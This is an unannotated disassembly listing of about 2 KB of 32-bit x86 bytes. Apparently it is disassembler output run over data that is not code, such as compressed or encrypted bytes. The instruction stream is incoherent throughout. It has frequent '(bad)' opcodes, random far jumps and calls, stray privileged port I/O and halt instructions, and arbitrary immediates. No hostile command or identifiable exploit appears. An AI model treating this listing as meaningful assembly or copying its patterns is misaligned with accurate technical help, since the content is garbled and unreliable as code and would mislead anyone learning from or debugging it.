  41845a:	ror    BYTE PTR [edx-0x7a61bb72],cl
  418460:	enter  0xc935,0x9c
  418464:	sub    al,bh
  418466:	mov    ebp,ss
  418468:	mov    ebx,0x84db7f49
  41846d:	xor    esp,DWORD PTR [edx-0x39fe81ed]
  418473:	cmp    eax,0xf00421d5
  418478:	int    0x87
  41847a:	add    edx,0x1e
  41847d:	jmp    DWORD PTR [edx-0x269af094]
  418483:	mov    esp,0xc21226e6
  418488:	fadd   QWORD PTR [edx]
  41848a:	loope  0x4184c3
  41848c:	rcr    BYTE PTR [edx],cl
  41848e:	xchg   ebx,eax
  41848f:	sbb    DWORD PTR [ebx-0x4f],0x4e
  418493:	imul   ebp,DWORD PTR [eax],0xffffff80
  418496:	push   ebp
  418497:	sub    dl,BYTE PTR [eax]
  418499:	(bad)  
  41849b:	shr    DWORD PTR ds:0xb471389f,cl
  4184a1:	mov    eax,0x4040d44d
  4184a6:	push   es
  4184a7:	(bad)  
  4184a8:	loop   0x418456
  4184aa:	push   ecx
  4184ab:	jmp    0xfdb4:0x692cb07a
  4184b2:	ja     0x41847f
  4184b4:	out    dx,eax
  4184b5:	inc    esi
  4184b6:	push   esp
  4184b7:	adc    eax,0x18bbea30
  4184bc:	sub    dl,BYTE PTR [ebp+0x5d39bb0f]
  4184c2:	inc    ebx
  4184c3:	dec    ebp
  4184c4:	rcl    DWORD PTR [eax-0x76240f2f],1
  4184ca:	std    
  4184cb:	dec    ebp
  4184cc:	mov    edx,0x4d8fa5cb
  4184d1:	rol    al,1
  4184d3:	repz ficomp WORD PTR [edi+0x74cb7ce9]
  4184da:	(bad)
  4184dd:	dec    DWORD PTR ds:0x27483730
  4184e3:	pop    ss
  4184e4:	sub    eax,0x77fc118
  4184e9:	jmp    0x418534
  4184eb:	repz jmp 0x15b4658b
  4184f1:	(bad)  
  4184f3:	adc    ch,BYTE PTR [edx+0x182577c8]
  4184f9:	xchg   ecx,eax
  4184fa:	stc    
  4184fb:	fld    DWORD PTR [bp+di-0x41f5]
  418500:	cmp    al,0xaa
  418502:	fidivr WORD PTR [ecx-0x2a]
  418505:	pop    ds
  418506:	jmp    0xe1846a7f
  41850b:	stc    
  41850c:	dec    eax
  41850d:	test   eax,0x3e1eb2f8
  418512:	xor    al,0xe0
  418514:	xlat   BYTE PTR ds:[ebx]
  418515:	inc    ecx
  418516:	xchg   ebx,eax
  418517:	sub    eax,0xd3c95c7
  41851c:	xor    ah,BYTE PTR [edi+ebx*1]
  41851f:	adc    eax,DWORD PTR [edx]
  418521:	or     ebp,edx
  418523:	aas    
  418524:	xchg   DWORD PTR [eax+0x219a356c],esi
  41852a:	les    edx,FWORD PTR [edx-0x1f]
  41852d:	mov    dh,0xf5
  41852f:	sbb    al,0x41
  418531:	push   ecx
  418532:	scas   al,BYTE PTR es:[edi]
  418533:	mov    bl,ch
  418535:	add    dl,BYTE PTR [edi]
  418537:	lods   al,BYTE PTR ds:[esi]
  418538:	add    al,0xbc
  41853a:	bound  ebp,QWORD PTR [ebp*2-0x659f18ab]
  418541:	adc    DWORD PTR [ebp+esi*8-0x9c9b52d],eax
  418548:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418549:	lahf   
  41854a:	xchg   edx,eax
  41854b:	aad    0x50
  41854d:	jbe    0x4185a9
  41854f:	cdq    
  418550:	bound  eax,QWORD PTR [eax+edi*2-0x63]
  418554:	jp     0x41852b
  418556:	es ins DWORD PTR es:[edi],dx
  418558:	inc    edx
  418559:	push   ds
  41855a:	sbb    eax,0xedec09cf
  41855f:	pop    eax
  418560:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418561:	jl     0x418548
  418563:	int    0xe3
  418565:	cld    
  418566:	inc    ebx
  418567:	inc    eax
  418568:	dec    ebp
  418569:	xlat   BYTE PTR ds:[ebx]
  41856a:	mov    esp,0xb2599f2a
  41856f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418570:	sar    al,cl
  418572:	xchg   ecx,eax
  418573:	inc    esi
  418574:	pop    ds
  418575:	mov    eax,edi
  418577:	cmp    edi,DWORD PTR [ebx-0x9]
  41857a:	sahf   
  41857b:	lods   al,BYTE PTR ds:[esi]
  41857c:	pusha  
  41857d:	pop    ebp
  41857e:	or     DWORD PTR [ebp+edx*4+0x7f],edi
  418582:	push   esp
  418583:	gs ret 
  418585:	mov    eax,0x4df9b8b7
  41858a:	mov    edi,0xc124e25f
  41858f:	lods   al,BYTE PTR ds:[esi]
  418590:	ins    BYTE PTR es:[edi],dx
  418591:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418592:	imul   eax,DWORD PTR [esi-0x38],0x7a7bdd37
  418599:	fadd   st(1),st
  41859b:	retf   0x4f2
  41859e:	aam    0x99
  4185a0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4185a1:	jmp    0x618d598f
  4185a6:	lods   al,BYTE PTR ds:[esi]
  4185a7:	mov    bl,0xc
  4185a9:	hlt    
  4185aa:	xor    BYTE PTR [edx-0x4c],dh
  4185ad:	fnsave [esi-0x7d]
  4185b0:	dec    edi
  4185b1:	xchg   ecx,eax
  4185b2:	imul   eax,DWORD PTR [edx+0x77f240fa],0x29
  4185b9:	test   esp,esp
  4185bb:	loopne 0x418576
  4185bd:	(bad)  
  4185be:	les    esi,FWORD PTR [edi+0x63]
  4185c1:	mov    esi,0x53d89371
  4185c6:	jnp    0x41858c
  4185c8:	int3   
  4185c9:	xchg   DWORD PTR [edx+0x30],esi
  4185cc:	sbb    DWORD PTR [ebx],ebx
  4185ce:	iret   
  4185cf:	mov    ecx,DWORD PTR [eax+0x5b969a4b]
  4185d5:	xchg   BYTE PTR ds:0x1c250896,ch
  4185db:	out    dx,al
  4185dc:	dec    BYTE PTR [esi]
  4185de:	(bad)  
  4185df:	mov    al,ds:0xa17b6942
  4185e4:	add    DWORD PTR [edx],ebx
  4185e6:	cmp    al,0x83
  4185e8:	mov    ch,0xdf
  4185ea:	out    dx,al
  4185eb:	xchg   BYTE PTR [ebp-0x7fe6111f],dl
  4185f1:	inc    ecx
  4185f2:	xor    ebx,ebx
  4185f4:	and    edx,DWORD PTR [ecx-0x2d]
  4185f7:	xchg   edi,eax
  4185f8:	sahf   
  4185f9:	test   eax,0x64040fd1
  4185fe:	int    0x19
  418600:	call   0x3b16:0xd0635668
  418607:	adc    ebx,DWORD PTR [edi]
  418609:	rcl    DWORD PTR [edx-0x78],0x8a
  41860d:	mov    edx,ecx
  41860f:	mov    al,0xe3
  418611:	out    0x2e,eax
  418613:	or     eax,ebx
  418615:	fidivr WORD PTR cs:[eax]
  418618:	inc    edi
  418619:	jg     0x4185bc
  41861b:	or     BYTE PTR [edx+eiz*1+0x1ee7022c],ch
  418622:	push   edx
  418623:	jo     0x41860f
  418625:	sbb    bl,BYTE PTR [ecx+0x32]
  418628:	ret    0x9ec
  41862b:	fucomp st(1)
  41862d:	std    
  41862e:	stos   DWORD PTR es:[edi],eax
  41862f:	xchg   ecx,eax
  418630:	scas   al,BYTE PTR es:[edi]
  418631:	pop    edi
  418632:	jno    0x41860c
  418634:	mov    edi,gs
  418636:	stos   BYTE PTR es:[edi],al
  418637:	call   0xe8f7:0x1b9e19a6
  41863e:	mov    ds:0x923010b,al
  418643:	les    ebp,FWORD PTR [esi]
  418645:	mov    edx,0x58e315f7
  41864a:	jmp    0x973d2ae5
  41864f:	lods   eax,DWORD PTR ds:[esi]
  418650:	fidiv  DWORD PTR [ebx-0x3f9c5eb0]
  418656:	add    esp,DWORD PTR [ecx]
  418658:	adc    eax,0xe38fec0e
  41865d:	xor    BYTE PTR [eax+edi*1-0x6f77eaa3],cl
  418664:	or     cl,ch
  418666:	and    eax,0x8e9708c0
  41866b:	jns    0x418644
  41866d:	push   cs
  41866e:	shl    DWORD PTR [ebx-0x2a9805f4],0x6c
  418675:	pop    es
  418676:	(bad)  
  418677:	jecxz  0x4186e0
  418679:	and    ebp,DWORD PTR [ebx-0x5ec496fd]
  41867f:	inc    esi
  418680:	xor    DWORD PTR [edi-0xc58fca2],0xc077ed64
  41868a:	jge    0x4186f8
  41868c:	jmp    0x418685
  41868e:	add    eax,0x1b5b39fa
  418693:	lds    ebp,FWORD PTR [esi]
  418695:	sub    eax,0x9d0c6743
  41869a:	jp     0x4186c1
  41869c:	sbb    eax,DWORD PTR [edi]
  41869e:	lock sub DWORD PTR [eax-0x6d],edx
  4186a2:	jb     0x418709
  4186a4:	leave  
  4186a5:	sahf   
  4186a6:	mov    eax,0x68dc6b5e
  4186ab:	push   ds
  4186ac:	xchg   edx,eax
  4186ad:	or     BYTE PTR [ecx-0x5f],al
  4186b0:	arpl   WORD PTR [eax],bx
  4186b2:	push   0xffffff89
  4186b4:	fucom  st(4)
  4186b6:	ret    
  4186b7:	stos   DWORD PTR es:[edi],eax
  4186b8:	sbb    DWORD PTR [ebx-0x4c48c06e],0x57
  4186bf:	aaa    
  4186c0:	cmp    cl,ch
  4186c2:	pop    es
  4186c3:	scas   al,BYTE PTR es:[edi]
  4186c4:	bound  ecx,QWORD PTR ds:0x48417e08
  4186ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4186cb:	repnz cmp ebp,ebp
  4186ce:	xor    BYTE PTR [edi],ch
  4186d0:	ds xchg edx,eax
  4186d2:	xchg   BYTE PTR [edi-0x79016134],cl
  4186d8:	or     DWORD PTR [ebx-0x1c],0xc8308188
  4186df:	jle    0x4186b6
  4186e1:	pop    esi
  4186e2:	(bad)  
  4186e3:	fadd   QWORD PTR [ecx-0xc776406]
  4186e9:	or     BYTE PTR ds:0xb7e2011,0x96
  4186f0:	sbb    BYTE PTR ds:0xf9e6455a,al
  4186f6:	and    BYTE PTR [edi+eax*2-0x6afef3c0],cl
  4186fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4186fe:	jecxz  0x41870c
  418700:	jg     0x418772
  418702:	pop    edi
  418703:	dec    eax
  418704:	je     0x4186c0
  418706:	inc    eax
  418707:	mov    cl,0xc3
  418709:	mov    edi,0x62d3ce4e
  41870e:	rol    BYTE PTR [esp+edi*4+0x23f0378e],cl
  418715:	inc    esi
  418716:	mov    dl,0xff
  418718:	(bad)  
  41871a:	mov    al,ds:0x36257558
  41871f:	mov    al,ds:0xf62d2381
  418724:	jl     0x4186fd
  418726:	xor    edi,DWORD PTR [edx+0x531d42d5]
  41872c:	adc    BYTE PTR [edx+0x646a8812],cl
  418732:	mov    ecx,0x7464274b
  418737:	sub    eax,0xa4b357c3
  41873c:	inc    ecx
  41873d:	aam    0x3f
  41873f:	add    eax,0xf6d4027
  418744:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418745:	aas    
  418746:	retf   
  418747:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418748:	mov    esp,0x53789a1d
  41874d:	cwde   
  41874e:	xor    al,0x2d
  418750:	fcomp  QWORD PTR [eax]
  418752:	jmp    0x418736
  418754:	je     0x41873d
  418756:	es dec eax
  418758:	loope  0x41872e
  41875a:	push   ebx
  41875b:	imul   al
  41875d:	sahf   
  41875e:	scas   eax,DWORD PTR es:[edi]
  41875f:	repnz test al,0x7e
  418762:	or     dl,BYTE PTR [edx]
  418764:	(bad)  
  418765:	ret    
  418766:	or     ecx,DWORD PTR [eax-0x57]
  418769:	lds    edx,FWORD PTR ds:0x7d062236
  41876f:	jno    0x418717
  418771:	data16 pop di
  418774:	push   ds
  418775:	mov    ebp,0x56ed55b5
  41877a:	pop    ecx
  41877b:	or     eax,0xa219a100
  418780:	lods   eax,DWORD PTR ds:[esi]
  418781:	mov    dh,0xec
  418783:	test   al,0xf0
  418785:	inc    esi
  418786:	mov    dh,0x6
  418788:	xchg   DWORD PTR [esi+0x107bdf3a],edi
  41878e:	pop    ds
  41878f:	adc    BYTE PTR gs:[ecx*8-0x675369e],ch
  418797:	and    DWORD PTR [ebx-0x1ab16a55],edx
  41879d:	cwde   
  41879e:	inc    ebp
  41879f:	addr16 (bad) 
  4187a1:	mov    ecx,0xc988ee08
  4187a6:	aaa    
  4187a7:	inc    edi
  4187a8:	sbb    DWORD PTR [ebp+ebx*4+0x6085b6ab],ebx
  4187af:	push   edi
  4187b0:	les    ecx,FWORD PTR [ecx-0x7d1d34e0]
  4187b6:	fimul  DWORD PTR [ebp+0x5d]
  4187b9:	hlt    
  4187ba:	adc    al,0x97
  4187bc:	mov    DWORD PTR [eax+0x2e],esi
  4187bf:	fadd   st(1),st
  4187c1:	mov    esi,0x286c26a
  4187c6:	adc    al,0xc4
  4187c8:	icebp  
  4187c9:	mov    al,ds:0xaf6097d4
  4187ce:	sbb    ebp,DWORD PTR [edi+0x5d952d06]
  4187d4:	retf   0xa3a5
  4187d7:	in     al,dx
  4187d8:	jmp    0xc23bb64d
  4187dd:	int3   
  4187de:	jo     0x4187ad
  4187e0:	test   BYTE PTR [di-0x38],bl
  4187e4:	jo     0x41876d
  4187e6:	pop    edx
  4187e7:	cmp    al,0xa2
  4187e9:	das    
  4187ea:	(bad)  
  4187eb:	jno    0x418816
  4187ed:	mov    ebx,0x5b00bff
  4187f2:	xchg   ecx,eax
  4187f3:	pop    esi
  4187f4:	(bad)  
  4187f5:	clc    
  4187f6:	aaa    
  4187f7:	inc    eax
  4187f8:	pop    esi
  4187f9:	push   ebp
  4187fa:	sbb    al,bh
  4187fc:	out    0xc5,eax
  4187fe:	adc    dl,BYTE PTR [edx+esi*4+0x2d790bee]
  418805:	jns    0x418831
  418807:	fisub  DWORD PTR [esi-0x9520ef1]
  41880d:	cld    
  41880e:	outs   dx,BYTE PTR ds:[esi]
  41880f:	int    0xc3
  418811:	inc    edx
  418812:	or     al,0xd0
  418814:	sbb    DWORD PTR [ebp-0x110c91ba],0xae9e3763
  41881e:	xchg   ebp,eax
  41881f:	xchg   edi,eax
  418820:	inc    BYTE PTR [ecx+edx*4-0x39]
  418824:	in     al,0x2d
  418826:	(bad)  
  418828:	xor    edi,edi
  41882a:	std    
  41882b:	pushf  
  41882c:	popf   
  41882d:	push   edi
  41882e:	add    eax,0x4da1e7d1
  418833:	fidivr WORD PTR [ecx]
  418835:	adc    ch,bh
  418837:	inc    eax
  418838:	pusha  
  418839:	shl    BYTE PTR [edx],1
  41883b:	jle    0x418882
  41883d:	stc    
  41883e:	jp     0x418817
  418840:	sbb    ebx,ebp
  418842:	in     al,0x64
  418844:	mov    ebx,0xd650e6af
  418849:	mov    ebp,0xe973521d
  41884e:	sub    al,0xed
  418850:	push   ebx
  418851:	mov    eax,ds:0xf757998f
  418856:	lea    edx,[ecx+0x4b7f6230]
  41885c:	jae    0x4188b7
  41885e:	ins    BYTE PTR es:[edi],dx
  41885f:	fdiv   DWORD PTR ds:0x38730c28
  418865:	mov    cl,0x33
  418867:	inc    ebx
  418868:	stos   BYTE PTR es:[edi],al
  418869:	mov    esi,ds
  41886b:	sbb    ch,al
  41886d:	xor    al,0x3
  41886f:	xor    ebx,DWORD PTR [eax+ecx*8-0x5a]
  418873:	aad    0xe2
  418875:	pop    edx
  418876:	or     esp,0x38
  418879:	call   0x44805373
  41887e:	lahf   
  41887f:	or     eax,0xe4959de5
  418884:	sbb    BYTE PTR [edx],bh
  418886:	sub    bh,dl
  418888:	ror    DWORD PTR [esi+edi*8+0x35],cl
  41888c:	pop    edx
  41888d:	lods   al,BYTE PTR ds:[esi]
  41888e:	xchg   esi,eax
  41888f:	or     cl,BYTE PTR [esi]
  418891:	lea    eax,[edi+eiz*1]
  418894:	push   edx
  418895:	xor    al,0x17
  418897:	pop    edi
  418899:	add    ebp,DWORD PTR [ecx]
  41889b:	stos   BYTE PTR es:[edi],al
  41889c:	adc    BYTE PTR [ecx-0x42],al
  41889f:	jo     0x4188ad
  4188a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4188a2:	in     al,0xd2
  4188a4:	popa   
  4188a5:	loope  0x418854
  4188a7:	int3   
  4188a8:	inc    ebx
  4188a9:	jb     0x41885a
  4188ab:	aad    0x3c
  4188ad:	cmp    BYTE PTR [ecx+0x5e7bc17c],0x8e
  4188b4:	pop    ecx
  4188b5:	les    esp,FWORD PTR [eax+0x3]
  4188b8:	(bad)  
  4188b9:	xchg   ecx,eax
  4188ba:	ret    
  4188bb:	mov    DWORD PTR [edi+eiz*1],esi
  4188be:	push   cs
  4188bf:	jmp    0xe042:0x901aaccc
  4188c6:	lods   eax,DWORD PTR ds:[esi]
  4188c7:	mov    al,ds:0xe17ca241
  4188cc:	imul   ebp,esi,0xbbfb3264
  4188d2:	ror    DWORD PTR [edx-0x7c],0x95
  4188d6:	sbb    al,0x80
  4188d8:	int3   
  4188d9:	fmulp  st(0),st
  4188db:	mov    cl,0x1c
  4188dd:	call   FWORD PTR [eax]
  4188df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4188e0:	sbb    al,0x18
  4188e2:	sub    DWORD PTR [esi-0x723cfbb9],edi
  4188e8:	pop    esp
  4188e9:	sbb    al,ch
  4188eb:	cmc    
  4188ec:	cmp    ecx,ebx
  4188ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4188ef:	fbstp  TBYTE PTR [eax+0x57]
  4188f2:	inc    eax
  4188f3:	and    eax,0x963c7fe7
  4188f8:	sbb    DWORD PTR [esp+0x6df07aa0],ebx
  4188ff:	outs   dx,BYTE PTR ds:[esi]
  418900:	jne    0x4188c7
  418902:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418903:	sub    al,bh
  418905:	(bad)  [eax+eiz*8-0x6a]
  418909:	pop    ss
  41890a:	in     al,0x88
  41890c:	ds push esp
  41890e:	cs retf 
  418910:	dec    ecx
  418911:	cmp    BYTE PTR [edx],0x3f
  418914:	inc    ebp
  418915:	fstp   QWORD PTR [ebx]
  418917:	mov    ds:0x311a561f,eax
  41891c:	pop    edx
  41891d:	fiadd  DWORD PTR [edx]
  41891f:	pop    edi
  418920:	add    BYTE PTR [edi+eax*2],ch
  418923:	fld    TBYTE PTR [edi*1+0x74b3feaa]
  41892a:	fs mov esi,0xd3ea349f
  418930:	aaa    
  418931:	sbb    eax,0x6d9e8730
  418936:	in     al,0x48
  418938:	mov    ebx,0x24ba75ff
  41893d:	lods   eax,DWORD PTR ds:[esi]
  41893e:	test   BYTE PTR [eax-0x3],bh
  418941:	retf   
  418942:	sar    DWORD PTR [ecx-0x6bbe6a16],cl
  418948:	aaa    
  418949:	pop    ds
  41894a:	jecxz  0x4188ee
  41894c:	cmp    BYTE PTR [ecx+0x30c767f0],ah
  418952:	jmp    0xbe01e61b
  418957:	mov    edx,0xf425eace
  41895c:	test   eax,0x4f9d90db
  418961:	mov    al,ds:0xa0054016
  418966:	arpl   WORD PTR [edi+0x23],dx
  418969:	pop    edi
  41896a:	mov    cl,ch
  41896c:	dec    ebp
  41896d:	sbb    al,0xdd
  41896f:	dec    edi
  418970:	pop    esp
  418971:	imul   eax,DWORD PTR [esi+0x1153fc18],0x36cb12ca
  41897b:	mov    ?,WORD PTR [esi]
  41897d:	ficom  DWORD PTR [eax-0x9d2defa]
  418983:	xchg   ebp,eax
  418984:	pushf  
  418985:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418986:	push   esp
  418987:	add    DWORD PTR [ecx],edi
  418989:	jnp    0x4189f2
  41898b:	pop    eax
  41898c:	jmp    0xe7fa:0x4ac18f1f
  418993:	sub    al,0x9e
  418995:	pop    ecx
  418996:	xchg   ebp,eax
  418997:	inc    edi
  418998:	pop    edi
  418999:	add    al,0xbe
  41899b:	shr    DWORD PTR [edi+0x34b5c4d],cl
  4189a1:	dec    edx
  4189a2:	jge    0x41894d
  4189a4:	pop    eax
  4189a5:	(bad)  
  4189a6:	mov    esi,0x1a73cffc
  4189ab:	mov    ecx,0xe8f1babd
  4189b0:	in     al,0x2f
  4189b2:	jb     0x418a26
  4189b4:	sbb    al,0xcd
  4189b6:	jbe    0x418a36
  4189b8:	in     al,dx
  4189b9:	(bad)  
  4189ba:	sub    eax,0x156d110d
  4189bf:	test   eax,0xa8e0f3e4
  4189c4:	popf   
  4189c5:	lea    ebp,[ebx+0x7a]
  4189c8:	ss cli 
  4189ca:	pop    es
  4189cb:	adc    eax,0x35207b07
  4189d0:	rcr    DWORD PTR [eax-0x5c54dc80],0xbb
  4189d7:	push   ebp
  4189d8:	outs   dx,DWORD PTR ds:[esi]
  4189d9:	shl    ch,0xf5
  4189dc:	add    DWORD PTR [ebx+0x1f],esp
  4189df:	mov    al,0xa
  4189e1:	cdq    
  4189e2:	push   esi
  4189e3:	ffree  st(6)
  4189e5:	lods   eax,DWORD PTR ds:[esi]
  4189e6:	push   esi
  4189e7:	fld    TBYTE PTR ds:0xfdc0584a
  4189ed:	mov    BYTE PTR [esi+0x1625e5a],ah
  4189f3:	lods   eax,DWORD PTR ds:[esi]
  4189f4:	mov    ds:0x16adb4f8,eax
  4189f9:	sahf   
  4189fa:	sub    al,0xb1
  4189fc:	mov    esi,0x6841b4fb
  418a01:	in     eax,dx
  418a02:	je     0x4189d6
  418a04:	sbb    al,0x4b
  418a06:	push   esp
  418a07:	mov    ecx,0x1b1d2727
  418a0c:	fmul   QWORD PTR [ecx-0x13ca11e4]
  418a12:	pop    edi
  418a13:	out    0xb5,eax
  418a15:	cwde   
  418a16:	push   eax
  418a17:	pusha  
  418a18:	lods   al,BYTE PTR ds:[esi]
  418a19:	or     esi,DWORD PTR [ebp+0x6f5374bd]
  418a1f:	outs   dx,DWORD PTR ds:[esi]
  418a20:	mov    bl,0xee
  418a22:	xchg   esi,eax
  418a23:	dec    ebp
  418a24:	xor    al,0x17
  418a26:	inc    edx
  418a27:	mov    DWORD PTR ds:0xcd748ed4,ebx
  418a2d:	jns    0x4189f0
  418a2f:	push   edx
  418a30:	sub    DWORD PTR [ebp*4+0x17f2f4d3],0xffffffdc
  418a38:	or     BYTE PTR [eax-0x1d28877e],bh
  418a3e:	xlat   BYTE PTR ds:[ebx]
  418a3f:	sbb    esi,DWORD PTR [edi]
  418a41:	ss push ds
  418a43:	xchg   ebp,eax
  418a44:	int    0x77
  418a46:	xchg   esp,eax
  418a47:	sbb    BYTE PTR [esi],ch
  418a49:	inc    ebx
  418a4a:	pop    ebx
  418a4b:	xchg   DWORD PTR [esp+edi*8],ecx
  418a4e:	cmp    eax,0x516676e7
  418a53:	in     eax,dx
  418a54:	jecxz  0x418a44
  418a56:	mov    ds:0x3daa8fa,al
  418a5b:	arpl   WORD PTR [eax],bp
  418a5d:	pop    esi
  418a5e:	push   ecx
  418a5f:	retf   
  418a60:	cmp    eax,DWORD PTR ds:0x998f01d5
  418a66:	nop
  418a67:	mov    edi,0x477ea860
  418a6c:	in     eax,dx
  418a6d:	cmp    al,0xe8
  418a6f:	dec    ebx
  418a71:	and    bl,dl
  418a73:	add    DWORD PTR cs:[esi],edi
  418a76:	inc    esp
  418a77:	sbb    ah,BYTE PTR [edx-0x2baf660]
  418a7d:	sbb    ebx,ebx
  418a7f:	xchg   esp,eax
  418a80:	out    0xd1,eax
  418a82:	adc    eax,0xebd92931
  418a87:	sbb    DWORD PTR [ebp+ebp*8+0xd],0xae34895b
  418a8f:	xor    eax,esi
  418a91:	in     al,0x74
  418a93:	mov    ds:0xf3422fd7,eax
  418a98:	ret    
  418a99:	mov    bl,0x65
  418a9b:	aas    
  418a9c:	push   edx
  418a9d:	ror    BYTE PTR [edx+0x591bce9c],cl
  418aa3:	mov    eax,0x95baa97f
  418aa8:	rcr    esi,cl
  418aaa:	stos   DWORD PTR es:[edi],eax
  418aab:	dec    esp
  418aac:	loopne 0x418a79
  418aae:	xlat   BYTE PTR ds:[ebx]
  418aaf:	cmp    BYTE PTR [edx-0x3f],cl
  418ab2:	xlat   BYTE PTR ds:[ebx]
  418ab3:	xchg   esi,eax
  418ab4:	mov    dl,0x48
  418ab6:	mov    DWORD PTR [ebp-0x10],edi
  418ab9:	cmc    
  418aba:	fcmovb st,st(4)
  418abc:	inc    ebx
  418abd:	sbb    eax,0x4979760
  418ac2:	jle    0x418a7c
  418ac4:	inc    esp
  418ac5:	add    ebp,DWORD PTR [eax-0x3c407344]
  418acb:	mov    WORD PTR [edi],?
  418acd:	mov    cl,0x38
  418acf:	ret    0xbcfb
  418ad2:	(bad)  
  418ad3:	mov    eax,0x9c176101
  418ad8:	inc    BYTE PTR [esi-0x4]
  418adb:	lock push ds
  418add:	loope  0x418aff
  418adf:	xchg   edx,eax
  418ae0:	fnstenv [ebx+ebp*8+0x2]
  418ae4:	or     eax,0x48904312
  418ae9:	test   esi,0x81e1b7bc
  418aef:	enter  0x585c,0x1d
  418af3:	outs   dx,DWORD PTR ds:[esi]
  418af4:	mov    eax,ds:0xb82de785
  418af9:	add    BYTE PTR [ebx+esi*2+0x33c9af90],dl
  418b00:	repnz out dx,eax
  418b02:	aaa    
  418b03:	mov    ch,0xf6
  418b05:	jmp    0xe886:0x88a10372
  418b0c:	aaa    
  418b0d:	pop    ebp
  418b0e:	mov    al,ds:0xee064fe8
  418b13:	scas   eax,DWORD PTR es:[edi]
  418b14:	fisubr DWORD PTR [ecx+0x87bc2f6]
  418b1a:	or     al,BYTE PTR [edx]
  418b1c:	hlt    
  418b1d:	lock in al,0x8a
  418b20:	sub    ecx,DWORD PTR [ebx]
  418b22:	xchg   edi,eax
  418b23:	push   0xc
  418b25:	jecxz  0x418b19
  418b27:	add    edi,DWORD PTR [esi+0x30]
  418b2a:	dec    ebp
  418b2b:	iret   
  418b2c:	or     DWORD PTR [edx],esi
  418b2e:	pop    esp
  418b2f:	xor    eax,0xf2b057a3
  418b34:	adc    esi,DWORD PTR [edi]
  418b36:	mov    dh,0x3e
  418b38:	adc    BYTE PTR [ebx+ebx*8-0x6f],bl
  418b3c:	idiv   dl
  418b3e:	jae    0x418b8c
  418b40:	cmp    eax,0xd95fef58
  418b45:	aas    
  418b46:	shr    BYTE PTR [esi+0x2697fe50],0x77
  418b4d:	jmp    FWORD PTR [esi]
  418b4f:	out    0x72,eax
  418b51:	mov    bl,0x91
  418b53:	in     al,0x6e
  418b55:	cmp    al,0x1e
  418b57:	aaa    
  418b58:	and    DWORD PTR [ebp+0x3b],ebx
  418b5b:	je     0x418bbf
  418b5d:	jo     0x418b01
  418b5f:	int3   
  418b60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418b61:	jbe    0x418b4c
  418b63:	rol    BYTE PTR [esi-0x2d],1
  418b66:	lds    esi,FWORD PTR [esi-0x7fc55a7c]
  418b6c:	dec    edx
  418b6d:	sti    
  418b6e:	mov    cl,BYTE PTR [edx]
  418b70:	xchg   esp,eax
  418b71:	dec    eax
  418b72:	mov    al,0x1f
  418b74:	leave  
  418b75:	mov    al,0x74
  418b77:	jne    0x418b4a
  418b79:	add    esi,eax
  418b7b:	scas   al,BYTE PTR es:[edi]
  418b7c:	sub    BYTE PTR [ebx-0x47],dh
  418b7f:	and    BYTE PTR [edx],dh
  418b81:	sbb    eax,0x29f3dbe6
  418b86:	xchg   ebx,eax
  418b87:	(bad)  
  418b88:	imul   esi,DWORD PTR [edi-0x60],0x1fc21dd5
  418b8f:	pop    esp
  418b90:	outs   dx,DWORD PTR ds:[esi]
  418b91:	inc    esp
  418b92:	leave  
  418b93:	or     eax,0xc6c4fb47
  418b98:	sub    BYTE PTR [esp+edx*8],ah
  418b9b:	ret    
  418b9c:	xor    esi,DWORD PTR [edx+eiz*2]
  418b9f:	push   eax
  418ba0:	xor    BYTE PTR [ecx],cl
  418ba2:	ins    BYTE PTR es:[edi],dx
  418ba3:	ja     0x418b93
  418ba5:	fbld   TBYTE PTR [eax-0x7b]
  418ba8:	ret    
  418ba9:	xchg   edi,eax
  418baa:	add    dl,ah
  418bac:	nop
  418bad:	out    dx,eax
  418bae:	lahf   
  418baf:	adc    ebp,DWORD PTR [esi-0x6c48469f]
  418bb5:	inc    ebp
  418bb6:	dec    esp
  418bb7:	adc    cl,BYTE PTR ds:0x53d44844
  418bbd:	mov    ds:0xd8e977a3,eax
  418bc2:	adc    BYTE PTR [ecx],cl
  418bc4:	ret    0xa421
  418bc7:	push   esi
  418bc8:	push   eax
  418bc9:	fxch   st(4)
  418bcb:	(bad)  [edi+ecx*8]
  418bce:	add    DWORD PTR [edx+edx*1-0x729a8f97],edx
  418bd5:	ret    
  418bd6:	push   bx
  418bd8:	arpl   WORD PTR [edi+0x52],sp
  418bdb:	aad    0x46
  418bdd:	fsubr  st,st(7)
  418bdf:	xchg   esi,eax
  418be0:	(bad)  
  418be1:	push   ebx
  418be2:	dec    ecx
  418be3:	shr    BYTE PTR [edx-0x14],cl
  418be6:	mov    al,ds:0xf8ab2d20
  418beb:	pop    es
  418bec:	fdivr  st(1),st
  418bee:	pop    esi
  418bef:	adc    BYTE PTR [eax],bl
  418bf1:	aad    0xd0
  418bf3:	jg     0x418c33
  418bf5:	xor    DWORD PTR [edi],edi
  418bf7:	pop    edi
  418bf8:	sti    
  418bf9:	sbb    DWORD PTR [edx+0xe],0xd34390d7
  418c00:	sbb    BYTE PTR [esi+0x57],cl
  418c03:	ret    
  418c04:	aam    0x9c
  418c06:	pop    ecx
  418c07:	pop    ecx
  418c08:	in     eax,0x94
  418c0a:	sub    al,BYTE PTR [eax+ebp*1-0x168af46f]
  418c11:	mov    edx,0x206c54e5
  418c16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418c17:	les    esi,FWORD PTR [edi-0x79a540f4]
  418c1d:	mov    eax,0xab72c283
  418c22:	pop    esi
  418c23:	mov    ch,0xf
  418c25:	push   ds
  418c26:	in     eax,dx
  418c27:	add    DWORD PTR [edi+esi*4+0x23b9214d],edi
  418c2e:	sub    al,0xc4
